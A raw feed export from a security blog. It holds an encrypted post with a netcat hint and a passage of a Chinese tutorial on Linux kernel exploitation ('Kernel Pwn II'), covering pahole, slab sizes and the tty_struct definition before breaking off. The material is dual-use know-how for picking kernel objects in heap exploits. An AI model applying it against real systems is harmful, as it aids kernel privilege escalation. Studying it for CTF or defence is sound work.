c31fb14c45f0d9522c2a9fc207c144fa9513028a4cac55771e7e1ac36a7f48581be1aeaeaef8b68a6c2492d402cc06be8b6349ec00b1046bcec17fb23a879b5f5f4b94998485205968bc29d2c1857ca49e973f6fb0048195bae596df828b5b5ecc4c0e94dd50bc1c3e7fc4c14673d12491b63839653fe39abf09c0cf2b4f6e5a63404e67536134c5e4ecf43cd13a47ddca421992b8ba2dc83a5080d6ce7b669518d7d3d4e99fb669a5b0801a5df06571d9a943dc99664a19864e9e8727468fb23b7efef0bbcd6afeb1c8e3ac038acf8cc15b62a54a17e9eb3925ca255cf82ee43e248ae2ded8d3c32bf70a86fd57ccd83825f4850f4069d0f8b5549420292e4c9cb0a8f5d51b990b52d3ec112d49498e2e228c9e542439f4d8db422bb9f671224002d0c72864f5f3e514037fed6a84dfc1d0c073b207932fe55f0342c79f19877f4580329b71206f75d1a6e36500e6a0e6a8b5554ae5ca785ed66f1fa5d1cbf1aae353c1f3d78c21e0d6856c872af419640b98785b7a24e0b276fd7eaf5ec3426658b34255301422b306ce9f3afe29ab58c4247a0f038e5107e7804f8139c194703fe5a68603465876395de189c98fffc50984d79cad7923ec2eee023e5592934823d65f172bb44f33061eb2eb5843ca590f3fa8f100b9706a06ae9c577cebabf523e71f5f5cf3e941db63c62b37221d05632c9ab9eb5e9d5ce0e6b22b85f7156528ba315b1827cf0f9ce5aab047dcc5aaec66d5f9b0d510bcb9b813a6113f79dbd1fbccb060d15bb1d0fc8f8684d0dbade9499b0bd864af41d8977109a1302ad4501a4bf1b6edad7180d5117eaade1573407649774e414648a5ee91dde0da1a4e34c38981aa019b66ce19f221475fddea98635fbbbf27a63c3c3b212e8d647b2ebe62bff0ae8ccdd803926eacd2e180dfe244f3a519c6da401210d0be90291bfd03b4df1a71117d3d2b4db62535a088c977500f22e69309f055d3be4c14c7900d9cdee5a91e84088855eb24fa0bc01ebe3d4fc9997881ac8037c1eb66a09b43f533ad4a18a32eb8eca0ce76bb4b55cb8b64993e8452c23cedc05dcf9f12fc4ae6bc44a96b46f960492ad375cff4eea359f359bf3ac4500a1df96213a909060983d69f54f0877668b2db1aaa27079d275fa2db9e17fc107fca82b98fdcebec3db4c18377c036e232db1ad6295621a571402ec73d4557f6586ab7c4fd859627d373c17d05c2a06fda1dc86ea9dd9096ace778c804392340138376d6dec112f72f6126ccfddabb1f96ad353a80af89e97fae0bad3ebfe0ff18dc27d21a74a10c44b69867b2bf7016b04062be3b704fd24ff98c470d7bfdf852fd13f70601e19648a5d478a4774c75f4c0b7b81c153fd3120169a089ce86b1a6e6ecd1a4d125225170d93d53e6c125fc3952a69321e45342a2431f49532d8a3c7b93f3726aec0ab6afc7ab752faf64f73ad7e883aedbb8327c6f6f357ea2c7166146b33497857a3dd97d82855a2102038d0142a7cfbb755ad0a0ca309f6ef7274b549928e4338d45830d226620d515c8ac93401d8d04c620995a8f751f63bec4f48cb4a66ea080eb2e1a0ffe3648b5a3fe9e052f6aafbae363ded9c5bc8b50bac79989b17a8e70f1904b055605ddc152e3a73545362cad6f2ba86b3777a053ed78b91e6c78bb328968f70f69e103803d1a2f132e2e1168276b1528a186e017a5999e44ed66beeca155380cc4657d8f6525e26f77c0c267ee3d414d22871838b4885e10b8a633b717d5fcbb121a8dacdbe797c3a7ec82c10481df0b269fffea7b79230899ae41a2c4786271194c85bd0b9eea048f3a24a36bd8b83ece6fd92cfe912f5dc0a0b9a10dba85f4b47461c1579a67aac59bbbc863d9a8c2617b3bb0615585f3bf7513d28cdb6725cf52f943250562808534fa426213aa8d4cf39086a181f1cf74e2db8f101a1a9697014134de431de4a33d5cc6c10e0a634190bea5068d29a37cb69be830d0b6cf8fcc47e106cb4d67c9074d919bac2a07f421e766d52b08f81cf29d462eee1bab8916f1808d450d36702e5a2aa609570161c4c358cf98a12c718b110724732b196e53c05097a724d663b6826633bcfd0eed6a6a4757aa66058affe3217a41433668fc380d4e3e6bfa06551746a2015cafa290038182c1932cf0c25f7af5e980b6856e451f2f0d6c3bbc620f3cbb09e5d73238943634a20c89ad35505fcd78dfdf74b4061808d8014ff6652df42f9ac3bb1d8a3a9e4067f5307bc15a766903e7ec7565e72c6eb8c21fa4f69253b17247118d9d45c2a06bccd8dbd42f3fe728a932e081f70bb98807258b2e2bcb694a801abb6e795eccc2884b291dbd8fa23ceed90bb87619b84988be76eee944ad900c69d9bba64177a3c24cb768866ad57f21046cc25b76a8720f28318da68a2f4f98bffe83843c2022128ef15ed3143bda0dbab70de89eb2b9f910935d35d6f455425987ac0f0bc435cffa418e73cf28e873e2ca7a37804c6e513708b8886b8dfb07c44b2c737d912dffc56844c32dd7b4fbecb615afde0cb8e4d5a8a6d1f6f15dbca72ecd8c90e8c456185877450564b6345c8b3e7cefb45c1ba28326103187a437e52ca1be5efb4f5936219155e522b5fa6b37c1bd1feb4c2b11787979422f1006eeb405f1795efa244319a15f7ad8ab171af2c2b9e9146bd147832ad57da36deac6b9f678c24a445548ec0275acf40d60881c399e89ad71b5f1da52ce6ba236de817bf02d7a8af99549467ed865ce304ebf7e31073008aef45321a5624b6851714d7042bce7827008d59050e4cb14d6b2f38a90bcc1da87bd4b4f75d02193552bc2a73e5a589d3cac6b8516cc2f0cd5a91571d1c2c97e06ac131d983d9b4ed07080e3789094d76f954973f1b0a0e35c73c3efb9158c425cdc435ff9245d9adcaa4b3c4631b791453a8dcab351025f3affc53a0083cd173b4ae44569203ca987d7e9247abb118e63099e55c70f081de4b5d4d725ab3f0205b6400db01ef004b55e3de1e16ba5dcffd5723913b67ac7624cfd98ac18530a2bff5534e7c50a734631781e7ec18db4866ea3eaf34f062c0b1ae203bff926ba8eb1d6f85ebfc3d1e301b69f8f0feeac1374541b6357359608ba224b3a44cd054b176fcec694c9c3d7c42b8c9fa5e147e84a2e44d76e0c50d2c13bc68bb90e6c13b5f7b3e3f9d68f011524c8e28c0f0a33abfa182231ca94e0b9ba10946d470c124de245e69763abea3ff171b37591bfa3b3df4f1592eab6eeca37dd4f9fcde369f7ed5913d0b11f09d3b3f74bbf1ef1284c678effba83ca236daaa29cb539122fac4d8d8e7744488aa41fa0919fd03df5e28a909489bded35dea78b1e5b104ea79a29fb3f57fded7aeba6533738c1825725d0339c8f979d9f72bf69e7cc01654730579a3e3615aeec9df8a4bca463a1c10fd6f0eecfc494214ae028c8395c3f5c5c485c9326776680a61a1fffd595c70c181621de2e158c257ea145d06b331df5fbfc8950c43d0decf847951160d1dfea17f7200261564f040642b6b25bbf7f665e69626decd90a9382bf44bf16202dd4c5f049d9937f080220a6affee0e532f93ce4f99c7ac5539dd0a2981aef1a03e14f37895da63122eb139c9b735b7b8e154b1fbb64e428cc7b0849853387ca553ddb10dcb485c2db2754bf934cb871aa31237b8f28cb3e4ecb6a5c354c098a1cab388bc5a83ccb96e93d211b8b660f21ff3ace58c0ab1f179ea02c1de817dcb9a7f2807cd347cb1016f7039014549d4565995dfe61702087106a2c432538cc9ed10a08bd0b4ad99401b1b8a399930353ab6bd332d301ec2be00c1d88e1070034edfeba085dd955d89495b7588cd3cd02eb0be3301f60aa807b56c06d0babac577258b68b3fa0e08010eb4df52973fdd640251978352b89a1ee9046a374a939608dbd0a04105627315fa32e0c5666aceffe420253c65ad6cecd14db88a2e2d6ce6b2e0baaa0f639916fd9813e03b2e06cc6098c9c87deb49d6314a1cdbcb891f4fbe7c95b0a41793a94f6eedaeafae7d4a818d53adad3e6ba4905bb93448ded5375fabc86cb75063f1f6d6b519a09ec2b0b01511963f663a8a71d97ece304847acbe1cea53a8de6ad668fc7515b978009f3fdcd444df0ca6cb43d715b199e1be063c7e96e4b2db2150c3fb0ce2235c9ddfdecb9ee9b399a8bfd5ef8d2b88716621e5f75bed046b75829a05535bc16a3f51a936a235e711ee9c3268cea90754058e756719761a379c14bbac42428ab2346c319b515bcecb106aa36e6ac559920d9e049cc5462397904fb55360a4f3e02a4387c518c55fe82158d1d647b84dc08f3857027a689bb6cad11783cb7155d2a3c4c7f8798b6076e7909e926a11f229ee9d3c117fdfb92118ee6ec46d13e8d28560b57a98533fec4335f7cdc7f5a19150014e93c0222fc7f98cd74a60864f50829885b1f56cf8ec9ba6ab01f21b584612d90a59ae0b048fc5f98aab4c365adf6b20c9c4b4df1aa8cee9a185a63c12fa5a1080895f5a01d81b1618bb22491321b2c94d1131e7ff1c472ad655f68f34b03b2ee6932f5f6bd43ce55d03e8494254bba954a7ca3d7c61908e33558cb51b52d2edf70568357b83ee961097be860040bd783374c8bfb334315998370caf3024b2fd42299a38228b45280e70755a75c0e61fb2a885623d96b018b3b8f7ff393811147c0e24444330219bf7df804bbeeef36059a153705c7ec425fa6bed98c975b656314a817dcd3517e6baede4b68d0ba9890a286cd47d8e37fe1fbf3e8492fd7d0e265b136d7a9decd92d5fd2499e3ef3d87ba89fa02ec1dc22b399109bcd8c9330d914c1aced52d370413f9eb7a52f01a9b94ce79ce2640eaa2529c225c06c01ea3b93f7aa268a58050a14620e2a0e525f532fe23361d6dd11d95a81cb8c4e479f5a66298eeb0ddf82465083714082e859a7282290f944aa60aad992a341acd08dcc0a7b10f5578c708cf9fde888ce10b16efb8ce69a032c2a24e191931c1e62ce44fc058f0351711184742975e997922589c0e344430c51777dd00696f2022baab76de8c7497eefa381a59310c127700e96184d0377b669fb42c454c4a1549482b5105224e4feab81e0b20fed6922eee3c31fe594483eb2d7f92c879116ab28328455035010383109573b69bf909ffc684d1036a5e7255ccc6801ae58f4a781f32c75eee411dbe0e893c9138c9bc0505470eb4854c74f9790f59f05c254b77ff79dc23ce6ad9cbb56f281c82e9bd2686de9d6723a333cce5c28fe3605af72bfc1b9c32ee01ab89472b8915371b5125499519caa4b11ba82364331bebdba39c1e58f7f81ccb58b16f09fe31fc9dfbad190a9139f43a80c45e04021a00c60a2a9fd468c925fcc9c0518b99528aab8931ab892d920e0d3257107a79dcae3852eaaa00848b06d36cf509b59bf2e0a1f705aeb89c39a172d2faf4573aa6b004d7d0ed4005a9b52eeb2b65ca681bdb544a9911805affa63efe36cd132a4b2bdd58e68c48a095cb72777854cc66c862958bdf7cb75b567cfe9a4aac16e20e5d0481b22036fe43e60b7b597dae145f2cd5437a56f40fe7a8c9d5026952e95ad35813db4e0c249fa2740ff9b7559e5a2a574d06a4f33f6123d9b8f9a4645f105fe2bc20593cee3064cd49e311cda603400b4ee40e4cfc98ca1727816d76a57329d09f958ff012159079d2350e5c7714869275bf406fc494715e5a0c906703fcc2fdbac714a087e3b4ccc4e32fe44fd7295e4a0800419d0298c7c8b0bf49679489b019877b3b0a5ccc04ef3c95e715a11bcefb6d1f49cc23f44ecdf7effab2882567ca7af4f921117fe9612517f0c5b5942dbf93e659861a01d6116608478424c113f1e971118a464af3cf0cc6819e91ba8d3efd6a8daaeab4718f51fa1e686d2e55f32a71d85a7c9e6a0416e88c4fd1d94e60a6346b306cd0e2c71e24c99a2ede14bf47caa22c67dd9b2e1baa66b720b8e7e9862853ad020ff309a03534a1de892a524257f8e2b15ce903cfb76c868ef022d829d31b33f853758ebac2fca7b36ed1feb77d59cd2e0cfbf73109112029d4afcad757bb1061f7712087e08c0bfa9c53a0039c4b395dda6140ed6ab993a1f81e1266b5d2c04e8dfdb7f1815955c76f3a4e4d94ba6cc9f13f4e654a78f34eb85f8160aa7b392969e72718cf13b99df99e09059d2117c5f596c6e3d4dda8ba347fef0a7aecb8d9eb0b821ccdd29838592f24e5a143d630c52c0d9137f7f00df229f443229ee811f18c5050983092d46081bef50353ca3f2435f9ccb6a22accd4da3d8ed5d2acc1c012e7f331e9fcddf7b8bbb4374729476c4a00a8a72105f0a205193ad4add39987d8008970d3fd45b5d0f10232892e2322bc4d412292124c1b6fd0537d0b37e0d18c113a4489c51541522724c246ed81a59966ef8670de205cd027e5a74cb51be698a41fa5bdfa3d78fefa0b0167e3b74808a2e4186faa16160c9656d0ff0c99c31dedfc91cd014086650a15de47fa8d303429f5d8447320ac08e7e5d9e677388fe618425eb697af587199d9b96223def1f4a99b77bffba83af5896a87221355b5fde1ecafdd5cf3a3c42c70bf96a53ce59c0a7d00099d8a2d8294a10dda6b4de4c0cd377461abe2185497d7076b4e94543ebefdc86b657237cd61eda2d802550f443feb44f90b87f47fafd789e1aa0432ceedad34aaf525b4ae5db096c897cd4da4641756263ea2daf4e7a455a4a081816b761e0c8a4044970e5d79fe4c69267645657f13219853780c34d5b7d51254ce55a0a6dc9c8fecd03935255478b08750d787e9dc20cf39de832d9dda8ae675077a53b92da5fa5106b26c1fdaeecc9b0eb9aec18da1b20ff7d0c5a2a8812a66e7b0aa18bb04c815d86cdb75a222aa2a5244c65d9e981a8945fd5a8f7bdd4b6c5046ec9216e6ba438a7fbb8f37aa9f34e68a16e52cd2d70d27f1c028483af1082198639922a3dd28442e8e85d2aeb2310be2e855ed60d6910ce32766a956f2edf0f426644d69ea7412f12e8f1d03bc671c776af163e9a3e16700028eb74887cbbf1fe8a3fba8f8751ed6f6744b3ce9ae17e46e07e2f458c0c64dd6f19dd728ee14206089f6374e1cc879b77ec0d81aee3ec45561e9b609dbbe3b79762e6488ecae911e3cac558407846f3cc4484cf70a9d7cd79e386371ecd338f5df3c45a7ae9d4ee0517a8eb141004f962fdcc61f60619ac905c3afd85bebbac6814bd9ae629fa330e6ff3146ac5f44b25b6f768e188bc9f948a314cd92359ef894893eb6ab6db5d322486e7484c42f5909222d330f2a97ce03e1d0961c5f2bd8de3e47cfb0859433432f2fc2cd3a905b26b3bc26cfb49f4758aea03fe9ea15bd8683ac016ddea4d3736d4221c3d3808920ae2e2afae3264b011cb9a3b5ffb774f3a13dcde705b4432ff96615c4da8a786dc0bbfeeffd8cef3ec1f1cb8a74aee5083dfa570d2fe381b7d92511445cb2295164e4220da9879b196e5b6b634dc707a791db535aeac0e8ee3ef217dccadbc42de2081c4b67f4b766eca117b131055be2133839b3f2ae5a7312adfe3c055a091901710326c15ec4fd083f10581af7c51402d04c3f05c8c6aa7a7f1bc4c26211645a66e4c3b60eae55af884c08d59e2bdfb685ae2c9dfe0af0780be6786b50b4fca621f7e118530dbd936a5dcaa81c34589992f5ce8df9891b2feb1fcdeeeead7d8a6eeb370e81f57d71952c53dc0f010005b83b6be9918002bfe2428ef5688a37cb5f4f88689bfe4d3c8f566d769fb762388ce285ba501b3250bc2a9d45206eea3fd18e175559e57b2fd3c4ec312a8352ff337a2a45170d199762b830e819eae714f6cb2d31b3751cc2ce2767bd43e25a8b22ef68b94ef110fb642bb9dd76ee6b9e8fe66fd26e939e708ed4034fd6540bc35a4240f2904d9c085dd68f10a45ea53c4904683fccb196b92e6230c48c6e2565c44c366e1356a2ced4e47fba3897da90a5cfb79f1e9ca4e682</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">nc sec.arttnba3.cn 25000</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">当每一次星光洒下，就没有什么值得害怕</summary>
    
    
    
    <category term="PIECES" scheme="http://blog.arttnba3.cn/categories/PIECES/"/>
    
    
  </entry>
  
  <entry>
    <title>【PWN.0x02】Linux Kernel Pwn II：通用结构体与技巧</title>
    <link href="http://blog.arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/"/>
    <id>http://blog.arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/</id>
    <published>2021-11-29T05:51:25.000Z</published>
    <updated>2022-07-03T20:05:41.561Z</updated>
    
    <content type="html"><![CDATA[<p>我是小小做题家</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>本篇博客中出现的源代码皆选自 Linux v5.15，不过大部分情况下本篇博文中的大部分结构体都不会随着版本更新而发生改动</p><h2 id="pahole：查阅内核结构体的工具"><a href="#pahole：查阅内核结构体的工具" class="headerlink" title="pahole：查阅内核结构体的工具"></a>pahole：查阅内核结构体的工具</h2><p>有的时候在<del>做CTF题</del>进行内核漏洞利用时，我们往往会遇到各种奇葩的通用分配结构体大小，而漏洞环境提供的结构体本身不能够帮助我们比较舒适地完成利用，此时我们需要找一个较为合适的结构体帮助我们完成利用，该怎么办？</p><p>可能大家会想到：自然是利用谷歌搜索一下有没有什么比较好用的结构体啦！或者是寻找一些前人留下的整合的成果，比如说<a href="https://zplin.me/papers/ELOISE.pdf">这篇论文</a>或者是其他大师傅的一些文章，偶尔或许也可能在某个角落翻到笔者的这篇博客（笑）</p><p>但最好的办法自然是<strong>自己动手丰衣足食</strong>，这里笔者向大家介绍一个工具——<code>pahole</code></p><p>用法比较简单，直接执行便能获取<strong>对应内核中所有结构体的信息，包括大小、各成员偏移量等</strong>，虽然有的内核编译时不一定会选择导出这玩意所要用的东西，但各个版本内核之间不会有太大差异，找一个相同版本的内核跑一遍 pahole 即可</p><h2 id="slab-amp-amp-slub-amp-amp-slob-分配-object-的最小大小"><a href="#slab-amp-amp-slub-amp-amp-slob-分配-object-的最小大小" class="headerlink" title="slab &amp;&amp; slub &amp;&amp; slob 分配 object 的最小大小"></a>slab &amp;&amp; slub &amp;&amp; slob 分配 object 的最小大小</h2><p>在 <code>include/linux/slab.h</code> 中有如下定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The largest kmalloc size supported by the SLAB allocators is</span></span><br><span class="line"><span class="comment"> * 32 megabyte (2^25) or the maximum allocatable page order if that is</span></span><br><span class="line"><span class="comment"> * less than 32 MB.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * WARNING: Its not easy to increase this value since the allocators have</span></span><br><span class="line"><span class="comment"> * to do various tricks to work around compiler limitations in order to</span></span><br><span class="line"><span class="comment"> * ensure proper constant folding.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_HIGH    ((MAX_ORDER + PAGE_SHIFT - 1) &lt;= 25 ? \</span></span><br><span class="line"><span class="meta">                (MAX_ORDER + PAGE_SHIFT - 1) : 25)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_MAX    KMALLOC_SHIFT_HIGH</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> KMALLOC_SHIFT_LOW</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_LOW    5</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Kmalloc subsystem.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> KMALLOC_MIN_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_MIN_SIZE (1 &lt;&lt; KMALLOC_SHIFT_LOW)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p> 即 <strong>slab 分配器分配的 object 的大小最小为 32，slob 和 slub 的最小 object 大小为 8</strong></p><h1 id="0x01-tty-设备结构体"><a href="#0x01-tty-设备结构体" class="headerlink" title="0x01.tty 设备结构体"></a>0x01.tty 设备结构体</h1><p>tty 设备可以说是 kernel pwn 入门当中 <em>最经典</em> 的利用目标，尤其是 <code>/dev/ptmx</code> ，相信大家已经对其再熟悉不过了，不过这里笔者还是简单介绍一下这个“万能”的 tty 设备及其相关内核结构体</p><h2 id="tty-struct（kmalloc-1k）"><a href="#tty-struct（kmalloc-1k）" class="headerlink" title="tty_struct（kmalloc-1k）"></a>tty_struct（kmalloc-1k）</h2><p>该结构体定义于 <code>include/linux/tty.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * struct tty_struct - state associated with a tty while open</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @flow.lock: lock for flow members</span></span><br><span class="line"><span class="comment"> * @flow.stopped: tty stopped/started by tty_stop/tty_start</span></span><br><span class="line"><span class="comment"> * @flow.tco_stopped: tty stopped/started by TCOOFF/TCOON ioctls (it has</span></span><br><span class="line"><span class="comment"> *              precedense over @flow.stopped)</span></span><br><span class="line"><span class="comment"> * @flow.unused: alignment for Alpha, so that no members other than @flow.* are</span></span><br><span class="line"><span class="comment"> *         modified by the same 64b word store. The @flow&#x27;s __aligned is</span></span><br><span class="line"><span class="comment"> *         there for the very same reason.</span></span><br><span class="line"><span class="comment"> * @ctrl.lock: lock for ctrl members</span></span><br><span class="line"><span class="comment"> * @ctrl.pgrp: process group of this tty (setpgrp(2))</span></span><br><span class="line"><span class="comment"> * @ctrl.session: session of this tty (setsid(2)). Writes are protected by both</span></span><br><span class="line"><span class="comment"> *          @ctrl.lock and legacy mutex, readers must use at least one of</span></span><br><span class="line"><span class="comment"> *          them.</span></span><br><span class="line"><span class="comment"> * @ctrl.pktstatus: packet mode status (bitwise OR of TIOCPKT_* constants)</span></span><br><span class="line"><span class="comment"> * @ctrl.packet: packet mode enabled</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * All of the state associated with a tty while the tty is open. Persistent</span></span><br><span class="line"><span class="comment"> * storage for tty devices is referenced here as @port in struct tty_port.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span>    magic;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span>    <span class="comment">/* class device or NULL (e.g. ptys, serdev) */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>        <span class="comment">/* winsize_mutex */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">spinlock_t</span> lock;</span><br><span class="line">        <span class="type">bool</span> stopped;</span><br><span class="line">        <span class="type">bool</span> tco_stopped;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> unused[<span class="number">0</span>];</span><br><span class="line">    &#125; __aligned(<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>)) flow;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">spinlock_t</span> lock;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> pktstatus;</span><br><span class="line">        <span class="type">bool</span> packet;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> unused[<span class="number">0</span>];</span><br><span class="line">    &#125; __aligned(<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>)) ctrl;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> hw_stopped;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> receive_room;    <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">    <span class="type">int</span> flow_change;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> write_wait;</span><br><span class="line">    <span class="type">wait_queue_head_t</span> read_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">    <span class="type">void</span> *disc_data;</span><br><span class="line">    <span class="type">void</span> *driver_data;</span><br><span class="line">    <span class="type">spinlock_t</span> files_lock;        <span class="comment">/* protects tty_files list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> closing;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *write_buf;</span><br><span class="line">    <span class="type">int</span> write_cnt;</span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span 